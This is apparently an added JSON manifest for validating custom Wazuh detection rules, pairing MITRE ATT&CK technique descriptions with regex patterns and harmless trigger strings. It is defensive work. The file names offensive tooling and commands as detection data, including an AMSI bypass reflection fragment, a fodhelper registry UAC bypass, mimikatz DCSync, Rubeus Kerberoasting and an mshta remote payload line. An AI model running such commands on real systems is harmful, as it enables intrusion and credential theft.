@@ -1,0 +1,3496 @@
+﻿{
+    "schema":  "wazuh-enterprise-rule-validation/v1",
+    "generated_at":  "2026-06-02T11:07:21.0259619+02:00",
+    "source_rules":  "C:\\Users\\rfk\\Documents\\Reguły Wazuh\\wazuh\\enterprise_rules.xml",
+    "safety_model":  "Endpoint scripts generate benign process/script-block telemetry with unique markers. Server-only entries must be checked against native integrations or Wazuh alerts.",
+    "rules":  [
+                  {
+                      "id":  "100600",
+                      "level":  8,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1566.001]: Office macro-related command line - base signal",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "office"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(winword|excel|powerpnt)\\.exe.*\\/(macro|vba|auto|xlm)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "winword.exe /macro WAZUH_VALIDATION_SAFE_MARKER",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100601",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1204.002/T1059]: Office spawned shell or script host",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "office",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.parentProcessName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(winword|excel|powerpnt|onenote)\\.exe$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.processName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(cmd|powershell|pwsh|wscript|cscript|mshta|regsvr32|rundll32)\\.exe$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100602",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS/PERSISTENCE [T1190/T1505.003]: Web shell access indicator",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "web"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "webshell"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.url",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(\\.php\\?cmd=|\\/shell\\.php|\\/c99\\.php|\\/r57\\.php|\\/webshell|cmd\\.exe\\?|\\/eval\\.php)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100603",
+                      "level":  10,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1190]: Sensitive file exposure attempt",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+                                       "web"
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "web"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "data.url",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(\\/\\.git\\/|\\/\\.env|\\/config\\.php\\.bak|\\/wp-config\\.php\\.bak|\\/\\.htpasswd)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100604",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1218.005]: MSHTA remote script execution",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "lolbas"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\bmshta\\.exe\\b.*(https?:|vbscript:|javascript:)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "mshta.exe https://example.invalid/payload.hta",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101001",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "INITIAL ACCESS [T1505.003/T1059]: Web server process spawned shell/interpreter",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "initial_access",
+                                     "webshell",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.parentProcessName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(w3wp|httpd|apache|nginx|php-cgi|tomcat|java)\\.exe$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.processName",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(cmd|powershell|pwsh|sh|bash|python|perl|nc|ncat)\\.exe?$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100615",
+                      "level":  11,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1562.001]: AMSI bypass keyword in command line",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "amsi_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(AmsiScanBuffer|AmsiInitFailed|amsiContext|amsiUtils)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "AmsiScanBuffer AmsiInitFailed amsiContext amsiUtils",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100616",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1562.001]: PowerShell reflection AMSI bypass",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "amsi_bypass",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)\\[Ref\\]\\.Assembly\\.GetType.*System\\.Management\\.Automation.*NonPublic"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "[Ref].Assembly.GetType(\u0027System.Management.Automation.AmsiUtils\u0027).GetField(\u0027x\u0027,\u0027NonPublic\u0027)",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100617",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION [T1562.001]: Obfuscated AMSI bypass variable pattern",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "amsi_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(Set-Variable.*amsi|sET-ItEM.*(\\*mDR|\\*iEX)|VaRiAbLe.*\\*Mdr)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "Set-Variable amsi placeholder",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101002",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "DEFENSE EVASION/EXECUTION [T1562.001/T1059.001]: Suspicious PowerShell script block",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "defense_evasion",
+                                     "powershell"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4104$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.scriptBlockText",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(AmsiUtils|amsiInitFailed|AmsiScanBuffer|System\\.Management\\.Automation|FromBase64String|DownloadString|IEX\\s*\\()"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_powershell_scriptblock",
+                      "trigger_text":  "AmsiUtils amsiInitFailed AmsiScanBuffer System.Management.Automation FromBase64String DownloadString IEX(",
+                      "notes":  "Wymaga wlaczonego PowerShell Script Block Logging oraz zbierania Event ID 4104 przez agenta.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100630",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1546.003]: WMI event subscription persistence",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "wmi"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)wmic.*(Create|Subscribe|Filter|Consumer).*(ActiveScript|CommandLine|EventFilter)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter Create ActiveScript CommandLine",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100631",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1546.003]: PowerShell WMI event subscription",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "wmi"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(New-WMIEvent|Set-WMIInstance|Register-WMIEvent).*(Filter|Consumer|Binding)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "New-WMIEvent Set-WMIInstance Register-WMIEvent Filter Consumer Binding",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100632",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1546.003]: WMI MOF compilation or script consumer indicator",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "wmi"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(scrcons\\.exe|mofcomp\\s+.*\\.mof)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "mofcomp C:\\Temp\\wazuh-validation.mof scrcons.exe",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101003",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PERSISTENCE [T1546.003]: Sysmon WMI event filter/consumer/binding created",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "persistence",
+                                     "wmi",
+                                     "sysmon"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(19|20|21)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100645",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PRIVILEGE ESCALATION [T1548.002]: Potential UAC bypass tool and registry pattern",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "privilege_escalation",
+                                     "uac_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(eventvwr|fodhelper|sdclt|cmstp|slui|wsreset)\\.exe.*reg"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "fodhelper.exe reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100646",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PRIVILEGE ESCALATION [T1548.002]: Registry-based UAC bypass preparation",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "privilege_escalation",
+                                     "uac_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)reg\\s+add.*HKCU\\\\Software\\\\Classes\\\\(ms-settings|mscfile|Folder\\\\shell)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d calc.exe",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100647",
+                      "level":  12,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "PRIVILEGE ESCALATION [T1548.002]: Known UAC bypass tool signature",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "privilege_escalation",
+                                     "uac_bypass"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(bypassuac|UACMe|akagi|elevate.*token)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "UACMe akagi bypassuac elevate token",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101004",
+                      "level":  14,
+                      "frequency":  2,
+                      "timeframe":  180,
+                      "description":  "PRIVILEGE ESCALATION [T1548.002]: Multiple UAC bypass indicators on same agent",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "uac_bypass"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "privilege_escalation",
+                                     "uac_bypass",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100645",
+                                                   "100646",
+                                                   "100647"
+                                               ]
+                  },
+                  {
+                      "id":  "100660",
+                      "level":  15,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1003.006]: DCSync command/tool execution",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "dcsync",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(lsadump::dcsync|mimikatz.*dcsync|invoke-dcsync|DRSGetNCChanges)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "mimikatz lsadump::dcsync DRSGetNCChanges",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100661",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1003.006]: Directory replication GUID access - tune DC/AAD Connect allowlists",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "dcsync"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4662$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.properties",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(1131f6aa-9c07-11d1-f79f-00c04fc2dcd2|1131f6ad-9c07-11d1-f79f-00c04fc2dcd2|89e95b76-444d-4c62-991a-0facbeda640c)"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101005",
+                      "level":  15,
+                      "frequency":  2,
+                      "timeframe":  300,
+                      "description":  "CREDENTIAL ACCESS [T1003.006]: Repeated DCSync indicators for same user",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+                                               "dcsync"
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "dcsync",
+                                     "critical"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+                                                   "100660"
+                                               ]
+                  },
+                  {
+                      "id":  "100675",
+                      "level":  6,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.003]: Kerberos TGS RC4 request - base signal",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "kerberoasting"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4769$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.ticketEncryptionType",
+                                         "type":  "pcre2",
+                                         "pattern":  "^0x17$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100676",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.003]: Kerberoasting tool execution",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "kerberoasting",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(invoke-kerberoast|rubeus.*kerberoast|GetUserSPNs|impacket.*GetUserSPNs)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "Rubeus.exe kerberoast GetUserSPNs",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100677",
+                      "level":  3,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.003]: Kerberos TGS request - low-level base signal",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "kerberoasting",
+                                     "noise_base"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4769$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100678",
+                      "level":  13,
+                      "frequency":  10,
+                      "timeframe":  300,
+                      "description":  "CREDENTIAL ACCESS [T1558.003]: Potential Kerberoasting - multiple RC4 TGS requests from same source",
+                      "if_sid":  [
+
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+                                             "100675"
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "kerberoasting"
+                                 ],
+                      "fields":  [
+
+                                 ],
+                      "endpoint_method":  "correlation",
+                      "trigger_text":  null,
+                      "notes":  "Regula korelacyjna; runner odpala reguly podrzedne z tej samej grupy, jesli da sie je bezpiecznie zainicjowac na endpoincie.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100690",
+                      "level":  8,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.004]: AS-REQ RC4 - base signal, validate pre-auth field",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "asrep_roasting"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4768$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.ticketEncryptionType",
+                                         "type":  "pcre2",
+                                         "pattern":  "^0x17$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100691",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.004]: AS-REP Roasting tool execution",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "asrep_roasting",
+                                     "critical"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.eventdata.commandLine",
+                                         "type":  "pcre2",
+                                         "pattern":  "(?i)(invoke-asreproast|rubeus.*asreproast|GetNPUsers|impacket.*GetNPUsers)"
+                                     }
+                                 ],
+                      "endpoint_method":  "windows_sysmon_commandline",
+                      "trigger_text":  "Rubeus.exe asreproast GetNPUsers",
+                      "notes":  "Bezpieczny trigger: podejrzany ciag jest tylko argumentem PowerShell Write-Output; Sysmon powinien zapisac commandLine.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "101006",
+                      "level":  13,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1558.004]: AS-REP Roasting candidate - no pre-auth with RC4",
+                      "if_sid":  [
+                                     "60009"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "asrep_roasting"
+                                 ],
+                      "fields":  [
+                                     {
+                                         "name":  "win.system.eventID",
+                                         "type":  "pcre2",
+                                         "pattern":  "^4768$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.ticketEncryptionType",
+                                         "type":  "pcre2",
+                                         "pattern":  "^0x17$"
+                                     },
+                                     {
+                                         "name":  "win.eventdata.preAuthType",
+                                         "type":  "pcre2",
+                                         "pattern":  "^(0|-|)$"
+                                     }
+                                 ],
+                      "endpoint_method":  "server_alert_check",
+                      "trigger_text":  null,
+                      "notes":  "Wymaga realnego zrodla logow albo walidacji po stronie serwera Wazuh.",
+                      "correlation_children":  [
+
+                                               ]
+                  },
+                  {
+                      "id":  "100705",
+                      "level":  14,
+                      "frequency":  null,
+                      "timeframe":  null,
+                      "description":  "CREDENTIAL ACCESS [T1649]: ADCS abuse tool indicator",
+                      "if_sid":  [
+                                     "67027"
+                                 ],
+                      "if_group":  [
+
+                                   ],
+                      "if_matched_sid":  [
+
+                                         ],
+                      "if_matched_group":  [
+
+                                           ],
+                      "groups":  [
+                                     "enterprise",
+                                     "credential_access",
+                                     "adcs_abuse"
+                                 ],
+                      "fields":  [
+                                     {
